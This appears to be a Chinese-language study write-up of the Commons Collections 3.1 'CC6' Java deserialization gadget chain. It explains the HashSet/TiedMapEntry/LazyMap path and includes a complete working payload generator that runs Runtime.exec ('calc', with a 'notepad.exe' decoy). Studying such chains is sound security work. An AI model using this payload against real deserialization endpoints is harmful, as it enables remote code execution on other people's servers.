# 环境搭建

- JDK 1.8
- Commons Collections 3.1

```
<dependencies>
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.1</version>
    </dependency>
</dependencies>
```

# 利用链分析

**利用链**

```
Gadget chain:
        java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            ...
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()
    by @matthias_kaiser
*/
```

在CC5中,我们通过toString来回调了TiedMapEntry.getValue方法,但是这个类还有另外一个hashCode方法也能调用getValue方法

![image-20220127114952220](images/1.png)

那就去找一个调用hashCode的地方,还记得在复现URLDNS链的时候我们去调用了URL.hashCode方法

同样的找到了HashMap的hash方法去调用hashCode

![image-20220127115219825](images/2.png)

当时是通过HashMap重写的readObject来触发hash函数的,但是在CC6中都是利用HashSet重写的readObject方法调用put在调用hash方法

```
public V put(K key, V value) {
    return putVal(hash(key), key, value, false, true);
}
```

HashSet中readObject方法

![image-20220127115534888](images/3.png)

因为e这个变量是从readObject中读出来的,可以在序列化是就添加进去,可以直接利用HashSet的add函数

这里的e就是hashCode的Key参数,应该为TiedMapEntry对象

对应的poc代码

```
TiedMapEntry tiedMap = new TiedMapEntry(outmap,123);
HashSet hashset =  new HashSet();
hashset.add(tiedMap);
```

不过这个add方法要注意了

```
public boolean add(E e) {
    return map.put(e, PRESENT)==null;
}
```

发现他也会调用一次put方法,会和我们原本的利用链走的路径一样也会进行一次命令执行

所以这里为了区分,我们就写两个命令执行的代码,真正反序列化执行的代码在add方法后通过反射修改

所以最后的poc

```
package CC6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CC6payload {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer[] faketransformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"notepad.exe"})
        };
        ChainedTransformer chain = new ChainedTransformer(faketransformers);

        Map innermap = new HashMap();
        Map outmap = LazyMap.decorate(innermap,chain);

        TiedMapEntry tiedMap = new TiedMapEntry(outmap,123);
        HashSet hashset =  new HashSet();
        hashset.add(tiedMap);
        outmap.remove(123);

        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chain, transformers);

        ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("CC6.bin"));
        os.writeObject(hashset);

        ObjectInputStream fos = new ObjectInputStream(new FileInputStream("CC6.bin"));
        fos.readObject();
    }
}
```

这里发现和之前有区别的一个地方是多了应该remove方法

因为我们add方法也会调用到LazyMap的get方法

```
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

之前我们都只调用过一次LazyMap方法,只关注了进入if调用transform方法

但是这个if进去后会对我们传入的key添加一个value也就是一个映射,所以当第二次执行到这个get方法的时候,map.containsKey(key)的返回值会为true,不会进入if,所以我们在执行完add方法后要删除这个key对应的映射

这样在反序列化的时候才会进入if

# 漏洞复现

![image-20220127121707053](images/4.png)

add执行的虚假命令和我们最后要执行的命令都执行成功

# 注意的问题

add方法也会执行一次命令,所以需要区分前面命令的差异并且删除掉get方法添加的映射以便反序列化的时候进入if执行真正要执行的命令

